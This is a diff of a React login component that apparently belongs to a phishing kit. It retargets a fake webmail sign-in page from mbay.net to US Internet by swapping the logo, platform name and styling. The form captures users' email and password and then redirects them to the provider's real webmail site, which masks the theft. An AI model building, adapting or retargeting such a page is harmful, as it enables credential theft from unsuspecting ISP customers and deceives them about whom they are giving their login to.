@@ -8,6 +8,7 @@ import axios from 'axios';
 
 import iglou from './iglou.png';
 import catskill from './catskill.png';
+import usi from './usi.png';
 
 
 function Home(){
@@ -16,7 +17,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Mbay-Net")
+    const[platform, setPlatform] = useState("USI")
 
     const[showError, setShowError] = useState(false);
 
@@ -42,7 +43,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://webmail.mbay.net/interface/root#/login';
+               window.location.href = 'https://webmail.usinternet.com/';
             }
           } catch (error) {
             // Handle error
@@ -70,50 +71,53 @@ function Home(){
 
 
 
-            <div className='text-center my-4'>
-            {/* <img  src={catskill} /> */}
+            <div className='text-center '>
+            <img  src={usi} className="myimage" />
 
             </div>
 
 
-            <div className='col-md-5 whitediv m-auto py-3 px-5'>
+            <div className='col-md-5 whitediv m-auto py-3 px-5 rounded border'>
 
 
-                <div className='text-center py-3 '>
+                {/* <div className='text-center py-3 '>
                     <p style={{
                         color:"black",
                         fontSize:"18px",
                         fontWeight:"400"
                     }}>Webmail Login - mbay.net</p>
 
-                </div>
+                </div> */}
                 
 
 
 
                 <form onSubmit={handleSubmit}>
 
+
+                    <p className='font-weight-bold text-center'>Webmail Login</p>
+
                     <div className='form-group'>
-                        <label className='label'> E-mail address</label>
+                       
                         <input type="email"onChange={function(e){
                             setUserName(e.target.value);
-                        }}value={email} className="form-control"required />
+                        }}value={email} className="form-control"placeholder="Username..."required />
 
                     </div>
 
 
                     <div className='form-group'>
-                        <label className='label'> Password</label>
+             
                         <input type="password"onChange={function(e){
                             setPassword(e.target.value);
-                        }}value={password} className="form-control"required />
+                        }}value={password} className="form-control"placeholder="Password..."required />
 
                     </div>
 
                    
 
 
-                    <div className='form-group'>
+                    {/* <div className='form-group'>
                     <label class="toggle-container">
                         <input type="checkbox"className='mycheck'/> 
                      <span class="toggle-slider"></span> <span className='px-3 'style={{
@@ -121,7 +125,7 @@ function Home(){
                      }}>Remember Me</span>
     </label>
 
-                    </div>
+                    </div> */}
 
 
                     {/* <div className='form-group'>
@@ -137,9 +141,7 @@ function Home(){
 
                     <div className='form-group text-center'>
 
-<button type='submit' style={{
-    background:"#019bc6",
-}}className='btn text-center w-50 font-weight-bold text-light'>LOGIN</button>
+<button type='submit'className='btn mybtn px-4 mt-4'>Sign In</button>
 
 
 
@@ -149,7 +151,10 @@ function Home(){
 </div>
 
 
-                 
+                 <div className='text-right'>
+                     <p className='font-weight-800'>Forgot Password ?</p>
+
+                 </div>
 
                 </form>
 
